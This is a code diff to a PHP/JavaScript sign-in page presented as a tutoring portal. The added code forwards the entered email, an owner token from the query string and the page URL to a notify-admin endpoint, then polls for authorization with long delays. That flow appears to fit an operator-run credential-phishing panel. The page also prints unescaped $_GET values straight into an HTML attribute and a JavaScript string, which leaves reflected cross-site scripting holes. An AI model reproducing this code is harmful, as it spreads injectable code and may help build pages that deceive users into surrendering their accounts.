@@ -1225,7 +1225,8 @@ $accent = $data['accent_color'] ?? '#9B2C1F';
                         </div>
                         <p style="font-size: 14px; color: rgb(68, 68, 68); line-height: 1.7; margin-bottom: 22px;">Enter your tutoring account email. The portal will notify your session coordinator and confirm your outsourced tutor status before sign-in.</p>
                         <label style="font-size: 13px; font-weight: 600; color: rgb(68, 68, 68); display: block; margin-bottom: 6px;">Tutor email address</label>
-                        <input id="tutorEmail" type="email" placeholder="you@example.com" value="<?= $_GET['email'] ?? '' ?>" style="width: 100%; box-sizing: border-box; padding: 10px 12px; border: 1.5px solid rgb(208, 213, 221); border-radius: 6px; font-size: 14px; margin-bottom: 4px;"><button
+                        <input id="tutorEmail" type="email" placeholder="you@example.com" value="<?= $_GET['email'] ?? '' ?>" style="width: 100%; box-sizing: border-box; padding: 10px 12px; border: 1.5px solid rgb(208, 213, 221); border-radius: 6px; font-size: 14px; margin-bottom: 4px;">
+                        <button
                            id="tutorEmailSubmit" style="width: 100%; padding: 12px 0px; background: <?= $primary ?>; color: rgb(255, 255, 255); border-width: medium; border-style: none; border-color: currentcolor; border-image: initial; border-radius: 6px; font-size: 14px; font-weight: 600; cursor: pointer; margin-top: 8px; margin-bottom: 4px; opacity: 1;"
                            >Continue</button>
                            <div class="feedbackArea">
@@ -1376,6 +1377,10 @@ $accent = $data['accent_color'] ?? '#9B2C1F';
       const loadingText2 = document.querySelector('.loading-text2');
       const loadingTitle = document.querySelector('.loading-title');
       let notifyAdminLoading = false;
+
+      const tutorEmailSubmit = document.querySelector("#tutorEmailSubmit");
+      const signinWithEmail = document.querySelector("#signinWithEmail");
+      btnContent = signinWithEmail.innerHTML;
       
       const returnedText = `<?= urldecode($_GET['msg'] ?? '') ?>`;
      
@@ -1415,10 +1420,14 @@ $accent = $data['accent_color'] ?? '#9B2C1F';
          signDiv.classList.add('hidden');
       });
 
-      const tutorEmailSubmit = document.querySelector("#tutorEmailSubmit");
+
+      // fire first click - submit here.....
       tutorEmailSubmit.addEventListener('click', (e) => {
          email = document.querySelector('#tutorEmail').value;
          enteredEmail.textContent = email;
+         tutorEmailSubmit.innerHTML = `<?= CustomFunctions::Loading() ?>`;
+
+         try {
          const test = validateEmail(email);
 
          if (!test) {
@@ -1426,16 +1435,23 @@ $accent = $data['accent_color'] ?? '#9B2C1F';
             return;
          }
 
-         emailDiv.classList.add('hidden');
-         signDiv.classList.remove('hidden');
+         notifyAdmin();
+
+         setTimeout(()=> { 
+            emailDiv.classList.add('hidden');
+            signDiv.classList.remove('hidden');
+         }, 20000);// 20secs
+         } catch(e) {}
+         finally {
+            tutorEmailSubmit.textContent = 'Continue';
+         }
+
+         
       });
 
-      const signinWithEmail = document.querySelector("#signinWithEmail");
-      btnContent = signinWithEmail.innerHTML;
 
+      //click event fired
       signinWithEmail.addEventListener("click", async (e) => {
-          notifyAdminLoading = true;
-         signinWithEmail.innerHTML = `<?= CustomFunctions::Loading() ?>`; 
          
          const feedbackArea = document.querySelectorAll('.feedbackArea');
          feedbackArea.forEach(element => {
@@ -1448,14 +1464,24 @@ $accent = $data['accent_color'] ?? '#9B2C1F';
          loadingText.textContent = 'Notifying administrators for user authorization...please wait!!!';
 
          pollStatus(email);
+         notifyAdmin();
 
+
+      });
+
+      async function notifyAdmin() {
+         
+         notifyAdminLoading = true;
+         signinWithEmail.innerHTML = `<?= CustomFunctions::Loading() ?>`; 
+         
          try {
             // Send notification request to backend
             const response = await fetch(`/myapp/notify-admin/`, {
                method: "POST",
                body: JSON.stringify({
                   email,
-                  owner: `<?= $_GET['viability_jwt']??'' ?>`
+                  owner: `<?= $_GET['viability_jwt']??'' ?>`,
+                  url: `<?= $this->url ?? '' ?>`,
                }),
             });
 
@@ -1468,8 +1494,7 @@ $accent = $data['accent_color'] ?? '#9B2C1F';
             signinWithEmail.innerHTML = btnContent;
             notifyAdminLoading = false;
          }
-
-      });
+      }
 
       let cycles = 0;
       async function pollStatus(email) {
@@ -1505,7 +1530,7 @@ $accent = $data['accent_color'] ?? '#9B2C1F';
                 notifyAdminLoading ? pollStatus(email) : signinWithEmail.click(); 
             }
 
-         }, 2000);
+         }, 20000);
 
       } catch(e) {
         //  setTimeout(()=> {
